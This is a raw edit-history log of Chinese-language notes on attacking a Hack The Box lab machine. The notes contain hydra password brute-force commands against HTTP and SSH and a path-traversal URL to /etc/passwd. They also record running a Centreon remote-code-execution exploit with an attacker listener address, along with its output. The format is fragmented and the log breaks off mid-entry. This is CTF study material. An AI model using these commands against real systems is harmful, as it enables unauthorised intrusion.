{"compress":true,"commitItems":[["f97fea29-e59f-4150-999b-f78301da13f7",1569547769132,"",[[1569547711657,["whale@Whale",[[1,0,"157\n===\n\n\n"]],[0,0],[10,10]]],[1569547732721,["whale@Whale",[[1,9,"Apache/2.4.29 (Ubuntu) Server "]],[9,9],[39,39]]],[1569547975496,["whale@Whale",[[1,9,"\n"]],[8,8],[9,9]]],[1569547977558,["whale@Whale",[[1,9,"22，80"]],[9,9],[14,14]]],[1569547978616,["whale@Whale",[[1,15,"\n"]],[14,14],[15,15]]],[1569547980320,["whale@Whale",[[1,16,"\n"]],[15,15],[16,16]]],[1569548016439,["whale@Whale",[[1,17,"![1]($res/1.PNG)\n\n"]],[16,16],[34,34]]],[1569548021577,["whale@Whale",[[-1,16,"\n"]],[16,16],[15,15]]],[1569548028446,["whale@Whale",[[1,33,"说明用户名可能是admin"]],[33,33],[46,46]]],[1569548029840,["whale@Whale",[[1,47,"\n"]],[46,46],[47,47]]],[1569548033886,["whale@Whale",[[-1,48,"Apache/2.4.29 (Ubuntu) Server "]],[48,78],[48,48]]],[1569548035949,["whale@Whale",[[1,14,"Apache/2.4.29 (Ubuntu) Server "]],[14,14],[44,44]]],[1569548037200,["whale@Whale",[[1,14,"\n"]],[14,14],[15,15]]],[1569548037736,["whale@Whale",[[1,15,"\n"]],[15,15],[16,16]]],[1569548135927,["whale@Whale",[[1,81,"\n"]],[79,79],[80,80]]],[1569548137276,["whale@Whale",[[1,80," hydra -l admin -P \r\n"]],[80,80],[101,101]]],[1569548250011,[null,[[-1,99,"\r"],[1,100,"\n"]],[99,99],[101,101]]],[1569548250011,[null,[[1,99,"\r"],[-1,99,"\n"]],[101,101],[99,99]]],[1569548216838,["whale@Whale",[[-1,99,"\r"],[1,100,"rockyou.txt "]],[99,99],[111,111]]],[1569548247928,["whale@Whale",[[1,112,"-"]],[112,112],[113,113]]],[1569548248629,["whale@Whale",[[-1,112,"-"]],[113,113],[112,112]]],[1569548249912,["whale@Whale",[[1,111,"-"]],[111,111],[112,112]]],[1569548251806,["whale@Whale",[[1,112,"s 80 "]],[112,112],[117,117]]],[1569548258738,["whale@Whale",[[1,8,"ca"]],[8,8],[10,10]]],[1569548259289,["whale@Whale",[[-1,8,"ca"]],[10,10],[8,8]]],[1569548267789,["whale@Whale",[[1,8,"参考资料：[http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)"]],[8,8],[143,143]]],[1569548268454,["whale@Whale",[[1,144,"\n"]],[143,143],[144,144]]],[1569548302789,["whale@Whale",[[1,253,"-f 10.10.10.157 http-get"]],[253,253],[277,277]]],[1569548400900,["whale@Whale",[[1,216,"\n"]],[215,215],[216,216]]],[1569548405536,["whale@Whale",[[1,216,"cd /usr/share/world"]],[216,216],[235,235]]],[1569548406134,["whale@Whale",[[-1,233,"ld"]],[235,235],[233,233]]],[1569548407636,["whale@Whale",[[1,233,"dlit"]],[233,233],[237,237]]],[1569548408118,["whale@Whale",[[-1,236,"t"]],[237,237],[236,236]]],[1569548410091,["whale@Whale",[[1,236,"sts/"]],[236,236],[240,240]]],[1569548410996,["whale@Whale",[[-1,239,"/"]],[240,240],[239,239]]],[1569548429752,["whale@Whale",[[1,301," /m"]],[241,301],[304,304]]],[1569548432613,["whale@Whale",[[1,304,"onitoring"]],[304,304],[313,313]]],[1569548494922,["whale@Whale",[[-1,302,"/"]],[303,303],[302,302]]],[1569548545857,["whale@Whale",[[1,302,"/"]],[302,302],[303,303]]],[1569548546571,["whale@Whale",[[1,316,"\n"]],[313,313],[314,314]]],[1569548546843,["whale@Whale",[[1,317,"\n"]],[314,314],[315,315]]],[1569548547659,["whale@Whale",[[-1,317,"\n"]],[315,315],[314,314]]],[1569548549120,["whale@Whale",[[1,315,", overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task\r\n[DATA] attacking http-get://10.10.10.157:80//monitoring\r\n"]],[315,315],[433,433]]],[1569548610048,[null,[[-1,374,"\r"],[1,375,"\n"],[-1,431,"\r"],[1,432,"\n"]],[374,374],[433,433]]],[1569548610049,[null,[[1,374,"\r"],[-1,374,"\n"],[1,431,"\r"],[-1,431,"\n"]],[433,433],[374,374]]],[1569548551778,["whale@Whale",[[-1,315,", overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task\r\n[DATA] attacking http-get://10.10.10.157:80//monitoring\r\n\n"]],[315,432],[315,315]]],[1569548555627,["whale@Whale",[[1,316,"\n"]],[313,313],[314,314]]],[1569548555819,["whale@Whale",[[1,317,"\n"]],[314,314],[315,315]]],[1569548556386,["whale@Whale",[[1,315," hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring"]],[315,315],[388,388]]],[1569548573964,["whale@Whale",[[-1,334,"rockyou.txt"]],[334,345],[334,334]]],[1569548579105,["whale@Whale",[[1,334,"3000-pass.txt"]],[334,334],[347,347]]],[1569548824248,["whale@Whale",[[1,393,"\n"]],[390,390],[391,391]]],[1569548824488,["whale@Whale",[[1,394,"\n"]],[391,391],[392,392]]],[1569548826548,["whale@Whale",[[1,392,"## ssh"]],[392,392],[398,398]]],[1569548826968,["whale@Whale",[[1,401,"\n"]],[398,398],[399,399]]],[1569548827581,["whale@Whale",[[1,399,"searchsploit -m exploits/linux/remote/45939.py"]],[399,399],[445,445]]],[1569548828384,["whale@Whale",[[1,448,"\n"]],[445,445],[446,446]]],[1569549234948,["whale@Whale",[[-1,399,"searchsploit -m exploits/linux/remote/45939.py\n"]],[399,446],[399,399]]],[1569549284019,["whale@Whale",[[1,400,"![6]($res/6.PNG)\n\n"]],[399,399],[417,417]]],[1569549286179,["whale@Whale",[[-1,399,"\n"]],[399,399],[398,398]]],[1569549446722,["whale@Whale",[[1,399,"\n"]],[398,398],[399,399]]],[1569549448471,["whale@Whale",[[1,399,"OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\r\n"]],[399,399],[461,461]]],[1569549510061,[null,[[-1,459,"\r"],[1,460,"\n"]],[459,459],[461,461]]],[1569549510061,[null,[[1,459,"\r"],[-1,459,"\n"]],[461,461],[459,459]]],[1569549496750,["whale@Whale",[[-1,459,"\r"],[1,480,"---"]],[479,479],[482,482]]],[1569549497072,["whale@Whale",[[1,484,"\n"]],[482,482],[483,483]]],[1569549500454,["whale@Whale",[[1,483,"searchspli"]],[483,483],[493,493]]],[1569549500855,["whale@Whale",[[-1,492,"i"]],[493,493],[492,492]]],[1569549503459,["whale@Whale",[[1,492,"oit -m exploits/linux/remote/45233.py"]],[492,492],[529,529]]],[1569549533474,["whale@Whale",[[1,529,"()"]],[529,529],[531,531]]],[1569549536217,["whale@Whale",[[-1,529,"()"]],[530,530],[529,529]]],[1569549537244,["whale@Whale",[[1,529,"（）"]],[529,529],[531,531]]],[1569549539364,["whale@Whale",[[1,530,"dai"]],[530,530],[533,533]]],[1569549539989,["whale@Whale",[[-1,530,"dai"]],[533,533],[530,530]]],[1569549542106,["whale@Whale",[[1,530,"代码错误"]],[530,530],[534,534]]],[1569549547825,["whale@Whale",[[1,530,"type error"]],[530,530],[540,540]]],[1569549550672,["whale@Whale",[[1,547,"\n"]],[545,545],[546,546]]],[1569549594437,["whale@Whale",[[1,546,"searchsploit -m exploits/linux/remote/45210.py\r\n"]],[546,546],[594,594]]],[1569549595871,["whale@Whale",[[1,546,"\n"],[-1,592,"\r"]],[545,545],[546,546]]],[1569549598359,["whale@Whale",[[1,529,"\n"]],[529,529],[530,530]]],[1569549605282,["whale@Whale",[[1,530,"45233.py"]],[530,530],[538,538]]],[1569549607468,["whale@Whale",[[1,530,"python "]],[530,530],[537,537]]],[1569549621599,["whale@Whale",[[1,610,"python 45210.py"]],[610,610],[625,625]]],[1569549640397,["whale@Whale",[[1,625," ()"]],[610,625],[628,628]]],[1569549642452,["whale@Whale",[[1,627,"TypeError"]],[627,627],[636,636]]],[1569549667959,["whale@Whale",[[1,639,"\n"]],[638,638],[639,639]]],[1569549668199,["whale@Whale",[[1,639,"exploits/linux/remote/45939.py\r\n"]],[639,639],[671,671]]],[1569549674021,["whale@Whale",[[1,639,"searchsploit -m"],[-1,669,"\r"]],[639,639],[654,654]]],[1569549674619,["whale@Whale",[[1,654," "]],[654,654],[655,655]]],[1569549683423,["whale@Whale",[[1,687,"\n"]],[686,686],[687,687]]],[1569549684015,["whale@Whale",[[-1,687,"\n"]],[687,687],[686,686]]],[1569549685764,["whale@Whale",[[-1,686,"\n"],[1,687,"python "]],[686,686],[693,693]]],[1569549739477,["whale@Whale",[[1,693,"45939.py --port 22 10.10.10.157 root（）"]],[693,693],[731,731]]],[1569549740302,["whale@Whale",[[1,730,"TypeError"]],[730,730],[739,739]]],[1569549752008,["whale@Whale",[[1,739,": an integer is required\r\n"]],[730,739],[765,765]]],[1569549754887,["whale@Whale",[[-1,763,"\r\n"]],[764,764],[763,763]]],[1569550025628,["whale@Whale",[[1,764,"\n\n"]],[764,764],[765,765]]],[1569550025843,["whale@Whale",[[1,766,"\n"]],[765,765],[766,766]]],[1569550027960,["whale@Whale",[[-1,766,"\n"],[1,767,"## web"]],[766,766],[772,772]]],[1569550046744,["whale@Whale",[[1,772,"\n\nnikto -h http://10.10.10.157"]],[772,772],[801,801]]],[1569550047339,["whale@Whale",[[1,802,"\n"]],[801,801],[802,802]]],[1569550170125,[null,[[-1,773,"\n"],[1,803,"\n"]],[773,773],[804,804]]],[1569550170125,[null,[[1,773,"\n"],[-1,802,"\n"]],[804,804],[773,773]]],[1569550146632,["whale@Whale",[[1,802,"http://10.10.10.157/aa.php"]],[802,802],[828,828]]],[1569550148578,["whale@Whale",[[1,802,"\n"]],[801,801],[802,802]]],[1569550149402,["whale@Whale",[[1,773,"\n"]],[772,772],[773,773]]],[1569550157804,["whale@Whale",[[1,773,"存在的目录http://10.10.10.157/aa.php"]],[773,773],[804,804]]],[1569550158706,["whale@Whale",[[1,805,"\n"]],[804,804],[805,805]]],[1569550160756,["whale@Whale",[[-1,836,"http://10.10.10.157/aa.php\n"]],[835,862],[835,835]]],[1569551190127,[null,[[-1,806,"\n"],[1,836,"\n"]],[806,806],[837,837]]],[1569551190127,[null,[[1,806,"\n"],[-1,835,"\n"]],[837,837],[806,806]]],[1569551148679,["whale@Whale",[[1,773,"\n"]],[772,772],[773,773]]],[1569551168888,["whale@Whale",[[1,773,"dirb http://10.10.10.157 -X .php"]],[773,773],[805,805]]],[1569551310158,[null,[[-1,839,"\n"],[1,869,"\n"]],[839,839],[870,870]]],[1569551310158,[null,[[1,839,"\n"],[-1,868,"\n"]],[870,870],[839,839]]],[1569551272270,["whale@Whale",[[1,869,"\n"]],[867,867],[868,868]]],[1569551273795,["whale@Whale",[[1,868,"GET, POST, OPTIONS, HEAD "]],[868,868],[893,893]]],[1569551370112,[null,[[-1,839,"\n"],[1,868,"\n"]],[839,839],[869,869]]],[1569551370112,[null,[[1,839,"\n"],[-1,867,"\n"]],[869,869],[839,839]]],[1569551346196,["whale@Whale",[[1,811,"\n"]],[811,811],[812,812]]],[1569551355696,["whale@Whale",[[1,839,"http://10.10.10.157/monitoring/"]],[839,839],[870,870]]],[1569551356643,["whale@Whale",[[1,871,"\n"]],[870,870],[871,871]]],[1569551911010,[null,[[-1,872,"\n"],[1,901,"\n"]],[872,872],[902,902]]],[1569551911010,[null,[[1,872,"\n"],[-1,900,"\n"]],[902,902],[872,872]]],[1569551863357,["whale@Whale",[[1,871,"http://10.10.10.157/panel.php"]],[871,871],[900,900]]],[1569552214022,[null,[[-1,901,"\n"],[1,930,"\n"]],[901,901],[931,931]]],[1569552214022,[null,[[1,901,"\n"],[-1,929,"\n"]],[931,931],[901,901]]],[1569552208580,["whale@Whale",[[1,765,"---"]],[765,765],[768,768]]],[1569552208828,["whale@Whale",[[1,769,"\n"]],[768,768],[769,769]]],[1569552210452,["whale@Whale",[[1,686,"\n"]],[686,686],[687,687]]],[1569552211139,["whale@Whale",[[-1,686,"\n"]],[687,687],[686,686]]],[1569552211956,["whale@Whale",[[1,765,"\n"]],[765,765],[766,766]]],[1569552274994,[null,[[-1,906,"\n"],[1,935,"\n"]],[906,906],[936,936]]],[1569552274995,[null,[[1,906,"\n"],[-1,934,"\n"]],[936,936],[906,906]]],[1569552214241,["whale@Whale",[[1,770,"hydra -l admin -P rockyou.txt 10.10.10.157 ssh"]],[770,770],[816,816]]],[1569552214579,["whale@Whale",[[1,817,"\n"]],[816,816],[817,817]]],[1569552518021,[null,[[-1,953,"\n"],[1,982,"\n"]],[953,953],[983,983]]],[1569552518021,[null,[[1,953,"\n"],[-1,981,"\n"]],[983,983],[953,953]]],[1569552517674,["whale@Whale",[[1,1009,"\n"]],[1008,1008],[1009,1009]]],[1569552578004,[null,[[-1,953,"\n"],[1,982,"\n"]],[953,953],[983,983]]],[1569552578005,[null,[[1,953,"\n"],[-1,981,"\n"]],[983,983],[953,953]]],[1569552518990,["whale@Whale",[[1,1009,"0.10.10.157/monitoring/../panel.php"]],[1009,1009],[1044,1044]]],[1569552520056,["whale@Whale",[[1,1045,"\n"]],[1044,1044],[1045,1045]]],[1569552523150,["whale@Whale",[[1,1009,"1"]],[1009,1009],[1010,1010]]],[1569552524290,["whale@Whale",[[-1,1046,"\n"],[1,1047,"t"]],[1046,1046],[1047,1047]]],[1569552524839,["whale@Whale",[[-1,1046,"t"],[1,1047,"\n"]],[1047,1047],[1046,1046]]],[1569552530372,["whale@Whale",[[-1,1046,"\n"],[1,1047,"跳转到panel.h"]],[1046,1046],[1056,1056]]],[1569552530960,["whale@Whale",[[-1,1055,"h"]],[1056,1056],[1055,1055]]],[1569552531590,["whale@Whale",[[1,1055,"php"]],[1055,1055],[1058,1058]]],[1569552531864,["whale@Whale",[[1,1058,"\n\n"]],[1058,1058],[1059,1059]]],[1569552552144,["whale@Whale",[[1,1060,"\n"]],[1059,1059],[1060,1060]]],[1569552552742,["whale@Whale",[[1,1060,"10.10.10.157/monitoring/../../../../../../../../../etc/passwd"]],[1060,1060],[1121,1121]]],[1569552553544,["whale@Whale",[[1,1122,"\n"]],[1121,1121],[1122,1122]]],[1569552638990,[null,[[-1,953,"\n"],[1,982,"\n"]],[953,953],[983,983]]],[1569552638990,[null,[[1,953,"\n"],[-1,981,"\n"]],[983,983],[953,953]]],[1569552629675,["whale@Whale",[[1,1122,"That is correct, no need for any creds if all you currentl see is m********, a*.php, and p******.php"]],[1122,1122],[1222,1222]]],[1569552882006,[null,[[-1,953,"\n"],[1,982,"\n"]],[953,953],[983,983]]],[1569552882006,[null,[[1,953,"\n"],[-1,981,"\n"]],[983,983],[953,953]]],[1569552877732,["whale@Whale",[[1,1223,"\n"]],[1222,1222],[1223,1223]]],[1569552879093,["whale@Whale",[[1,1223,"[argot](https://forum.hackthebox.eu/profile/argot)\n\n[September 14](https://forum.hackthebox.eu/discussion/comment/45893/#Comment_45893)\n\nIf you are having trouble finding a thing past the regular dirb stuff, I suppose the right dictionary list would help, but you really only need to consider a couple of verbs."]],[1223,1223],[1534,1534]]],[1569552942999,[null,[[-1,953,"\n"],[1,982,"\n"]],[953,953],[983,983]]],[1569552942999,[null,[[1,953,"\n"],[-1,981,"\n"]],[983,983],[953,953]]],[1569552882812,["whale@Whale",[[-1,1223,"[argot](https://forum.hackthebox.eu/profile/argot)\n\n[September 14](https://forum.hackthebox.eu/discussion/comment/45893/#Comment_45893)\n"]],[1223,1359],[1223,1223]]],[1569552883252,["whale@Whale",[[-1,1223,"\n"]],[1223,1223],[1222,1222]]],[1569552884156,["whale@Whale",[[1,1223,"\n"]],[1222,1222],[1223,1223]]],[1569552906116,["whale@Whale",[[1,953,"\n"]],[952,952],[953,953]]],[1569553003001,[null,[[-1,954,"\n"],[1,983,"\n"]],[954,954],[984,984]]],[1569553003002,[null,[[1,954,"\n"],[-1,982,"\n"]],[984,984],[954,954]]],[1569552962303,["whale@Whale",[[1,953,"S."]],[953,953],[955,955]]],[1569552963052,["whale@Whale",[[-1,953,"S."]],[955,955],[953,953]]],[1569552964187,["whale@Whale",[[1,953,"s...."]],[953,953],[958,958]]],[1569552965978,["whale@Whale",[[1,959,"\n"]],[958,958],[959,959]]],[1569553124023,[null,[[-1,960,"\n"],[1,989,"\n"]],[960,960],[990,990]]],[1569553124024,[null,[[1,960,"\n"],[-1,988,"\n"]],[990,990],[960,960]]],[1569553116063,["whale@Whale",[[1,958,"-s--"]],[958,958],[962,962]]],[1569553116715,["whale@Whale",[[-1,960,"--"]],[962,962],[960,960]]],[1569553117703,["whale@Whale",[[1,960,"...."]],[960,960],[964,964]]],[1569553366008,[null,[[-1,966,"\n"],[1,995,"\n"]],[966,966],[996,996]]],[1569553366008,[null,[[1,966,"\n"],[-1,994,"\n"]],[996,996],[966,966]]],[1569553310560,["whale@Whale",[[1,965,"c...n"]],[965,965],[970,970]]],[1569553311248,["whale@Whale",[[1,971,"\n"]],[970,970],[971,971]]],[1569553731003,[null,[[-1,972,"\n"],[1,1001,"\n"]],[972,972],[1002,1002]]],[1569553731004,[null,[[1,972,"\n"],[-1,1000,"\n"]],[1002,1002],[972,972]]],[1569553692212,["whale@Whale",[[1,391," hydra -l admin -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n"]],[391,391],[465,465]]],[1569553696161,["whale@Whale",[[-1,401,"admin"],[1,406,"panel"]],[401,406],[406,406]]],[1569553713824,["whale@Whale",[[1,465," hydra -l panel -P rockyou.txt -s 80 -f 10.10.10.157 http-get /monitoring\n"]],[391,465],[539,539]]],[1569553719635,["whale@Whale",[[-1,474,"panel  "]],[474,480],[474,474]]],[1569553721712,["whale@Whale",[[1,474," aa "]],[474,474],[478,478]]],[1569553971000,[null,[[-1,1117,"\n"],[1,1146,"\n"]],[1117,1117],[1147,1147]]],[1569553971001,[null,[[1,1117,"\n"],[-1,1145,"\n"]],[1147,1147],[1117,1117]]],[1569553924969,["whale@Whale",[[1,1563,"\n"]],[1562,1562],[1563,1563]]],[1569553925329,["whale@Whale",[[1,1564,"\n"]],[1563,1563],[1564,1564]]],[1569553926225,["whale@Whale",[[-1,1564,"\n"]],[1564,1564],[1563,1563]]],[1569553931251,["whale@Whale",[[1,1564,"![7]($res/7.PNG)\n\n"]],[1563,1563],[1581,1581]]],[1569553945446,["whale@Whale",[[1,1115,"centreon"]],[1115,1115],[1123,1123]]],[1569553947954,["whale@Whale",[[-1,1111,"...nc"]],[1110,1115],[1110,1110]]],[1569554211012,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569554211012,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569554151436,["whale@Whale",[[1,1584,">v. 19.04.0"]],[1584,1584],[1595,1595]]],[1569554152536,["whale@Whale",[[-1,1584,">"]],[1585,1585],[1584,1584]]],[1569554154455,["whale@Whale",[[1,1584,"\n"]],[1583,1583],[1584,1584]]],[1569554164668,["whale@Whale",[[1,1584,"searchsploit centreon\r\n"]],[1584,1584],[1607,1607]]],[1569554166024,["whale@Whale",[[-1,1605,"\r\n"]],[1606,1606],[1605,1605]]],[1569554270993,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569554270993,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569554268894,["whale@Whale",[[1,1617,"\n"]],[1616,1616],[1617,1617]]],[1569554270218,["whale@Whale",[[1,1617,"python 47069.py http://10.10.10.157/centreon/ admin admin 10.10.10.157 80\r\n"]],[1617,1617],[1692,1692]]],[1569557331139,[null,[[-1,1120,"\n"],[1,1149,"\n"],[-1,1690,"\r"],[1,1691,"\n"]],[1120,1120],[1692,1692]]],[1569557331140,[null,[[1,1120,"\n"],[-1,1148,"\n"],[1,1690,"\r"],[-1,1690,"\n"]],[1692,1692],[1120,1120]]],[1569557303924,["whale@Whale",[[-1,1690,"\r"],[1,1691,"\n"]],[1691,1691],[1692,1692]]],[1569557309446,["whale@Whale",[[1,1693,"![8]($res/8.PNG)\n\n"]],[1692,1692],[1710,1710]]],[1569557751144,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569557751144,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569557710793,["whale@Whale",[[1,1175,"---"]],[1175,1175],[1178,1178]]],[1569557712023,["whale@Whale",[[1,1175,"\n"]],[1174,1174],[1175,1175]]],[1569557716096,["whale@Whale",[[1,1293,"\n"]],[1292,1292],[1293,1293]]],[1569557716576,["whale@Whale",[[1,1294,"\n"]],[1293,1293],[1294,1294]]],[1569557717222,["whale@Whale",[[1,1294,"---"]],[1294,1294],[1297,1297]]],[1569557717904,["whale@Whale",[[1,1298,"\n"]],[1297,1297],[1298,1298]]],[1569557871119,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569557871119,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569557863392,["whale@Whale",[[-1,1679,"admin "]],[1685,1685],[1679,1679]]],[1569557865777,["whale@Whale",[[1,1679,"passwd "]],[1679,1679],[1686,1686]]],[1569557867976,["whale@Whale",[[-1,1703,"\n"]],[1703,1703],[1702,1702]]],[1569557931135,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569557931135,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569557882775,["whale@Whale",[[1,1721,"\n"]],[1720,1720],[1721,1721]]],[1569557887384,["whale@Whale",[[1,1722,"![9]($res/9.PNG)\n\n"]],[1721,1721],[1739,1739]]],[1569557889184,["whale@Whale",[[-1,1733,"."]],[1734,1734],[1733,1733]]],[1569557891055,["whale@Whale",[[1,1733,"."]],[1733,1733],[1734,1734]]],[1569557892440,["whale@Whale",[[-1,1721,"\n"]],[1721,1721],[1720,1720]]],[1569558172026,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569558172026,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569558144292,["whale@Whale",[[1,1703,"\n"]],[1702,1702],[1703,1703]]],[1569558145971,["whale@Whale",[[1,1703,"`"]],[1703,1703],[1704,1704]]],[1569558146603,["whale@Whale",[[-1,1703,"`"]],[1704,1704],[1703,1703]]],[1569558147445,["whale@Whale",[[1,1703,"```"]],[1703,1703],[1706,1706]]],[1569558147868,["whale@Whale",[[1,1707,"\n"]],[1706,1706],[1707,1707]]],[1569558148084,["whale@Whale",[[1,1708,"\n"]],[1707,1707],[1708,1708]]],[1569558148786,["whale@Whale",[[1,1708,"```"]],[1708,1708],[1711,1711]]],[1569558150169,["whale@Whale",[[1,1707,"[+] Retrieving CSRF token to submit the login form\r\n47069.py:38: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\r\n\r\nThe code that caused this warning is on line 38 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\r\n\r\n  soup = BeautifulSoup(html_content)\r\n[+] Login token is : 184639f4656756696eb3efd175cdee66\r\n[+] Logged In Sucssfully\r\n[+] Retrieving Poller token\r\n47069.py:56: UserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system (\"lxml\"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.\r\n\r\nThe code that caused this warning is on line 56 of the file 47069.py. To get rid of this warning, pass the additional argument 'features=\"lxml\"' to the BeautifulSoup constructor.\r\n\r\n  poller_soup = BeautifulSoup(poller_html)\r\nTraceback (most recent call last):\r\n  File \"47069.py\", line 57, in <module>\r\n    poller_token = poller_soup.findAll('input')[24].get(\"value\")\r\nIndexError: list index out of range\r\n"]],[1707,1707],[3099,3099]]],[1569558154547,["whale@Whale",[[-1,1757,"\r"],[-1,2057,"\r"],[-1,2059,"\r"],[-1,2239,"\r"],[-1,2241,"\r"],[-1,2279,"\r"],[-1,2334,"\r"],[-1,2360,"\r"],[-1,2389,"\r"],[-1,2689,"\r"],[-1,2691,"\r"],[-1,2871,"\r"],[-1,2873,"\r"],[-1,2917,"\r"],[-1,2953,"\r"],[-1,2994,"\r"],[-1,3060,"\r"],[-1,3097,"\r"],[-1,3122,""],[1,3138,"\n"]],[3121,3121],[3122,3122]]],[1569558292020,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569558292021,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569558291717,["whale@Whale",[[-1,1693,"0.157"]],[1692,1698],[1693,1693]]],[1569558352009,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569558352009,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569558293962,["whale@Whale",[[1,1693,"4.10"]],[1693,1693],[1697,1697]]],[1569558295515,["whale@Whale",[[-1,1697," 80"]],[1697,1697],[1697,1697]]],[1569558315096,["whale@Whale",[[1,1697," 889"]],[1697,1697],[1701,1701]]],[1569558412000,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569558412000,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569558378818,["whale@Whale",[[1,1627,"\n"]],[1626,1626],[1627,1627]]],[1569558379603,["whale@Whale",[[-1,1627,"\n"]],[1627,1627],[1626,1626]]],[1569558380073,["whale@Whale",[[1,1627,"\n"]],[1626,1626],[1627,1627]]],[1569558381609,["whale@Whale",[[1,1628,"\n"]],[1627,1627],[1628,1628]]],[1569558383701,["whale@Whale",[[1,1628,"can"]],[1628,1628],[1631,1631]]],[1569558384320,["whale@Whale",[[-1,1628,"can"]],[1631,1631],[1628,1628]]],[1569558385882,["whale@Whale",[[1,1628,"参考资料"]],[1628,1628],[1632,1632]]],[1569558388413,["whale@Whale",[[-1,1630,"资料"]],[1632,1632],[1630,1630]]],[1569558390284,["whale@Whale",[[1,1630,"资料：[https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/)"]],[1630,1630],[1789,1789]]],[1569558390953,["whale@Whale",[[1,1790,"\n"]],[1789,1789],[1790,1790]]],[1569558832037,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569558832037,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569558821220,["whale@Whale",[[1,3250,"\n"]],[3249,3249],[3250,3250]]],[1569558827675,["whale@Whale",[[1,3253,"10]($res/10.PNG)\n\n!["]],[3250,3250],[3270,3270]]],[1569558892024,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569558892024,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569558834129,["whale@Whale",[[-1,3271,"![8]($res/8.PNG)\n\n![9]($res/9.PNG)"]],[3271,3305],[3271,3271]]],[1569558837628,["whale@Whale",[[1,1791,"\n"]],[1790,1790],[1791,1791]]],[1569558839072,["whale@Whale",[[1,1791,"![8]($res/8.PNG)\n\n![9]($res/9.PNG)"]],[1791,1791],[1825,1825]]],[1569558839732,["whale@Whale",[[1,1826,"\n"]],[1825,1825],[1826,1826]]],[1569558952012,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569558952012,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569558920866,["whale@Whale",[[1,3307," poller_token = poller_soup.find('input', {'name': 'centreon_token'}).get('value')"]],[3307,3307],[3389,3389]]],[1569559375029,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569559375030,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569559363575,["whale@Whale",[[1,3392,"![11]($res/11.PNG)\n\n"]],[3391,3391],[3411,3411]]],[1569559365209,["whale@Whale",[[-1,3391,"\n"]],[3391,3391],[3390,3390]]],[1569559982007,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569559982007,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569559933417,["whale@Whale",[[1,1616,"\n"]],[1615,1615],[1616,1616]]],[1569559937433,["whale@Whale",[[1,1616,"searchsploit -m exploitdb/exploits/php/webapps/47069.py"]],[1616,1616],[1671,1671]]],[1569559954402,["whale@Whale",[[-1,1954,"889"],[1,1957,"13300"]],[1954,1957],[1959,1959]]],[1569559955985,["whale@Whale",[[-1,1958,"0"]],[1959,1959],[1958,1958]]],[1569560582026,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569560582026,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569560527886,["whale@Whale",[[1,1889,"3.6"]],[1889,1889],[1892,1892]]],[1569560570275,["whale@Whale",[[-1,1930,"/"]],[1931,1931],[1930,1930]]],[1569561062065,[null,[[-1,1120,"\n"],[1,1149,"\n"]],[1120,1120],[1150,1150]]],[1569561062065,[null,[[1,1120,"\n"],[-1,1148,"\n"]],[1150,1150],[1120,1120]]],[1569561030741,["whale@Whale",[[-1,3366," 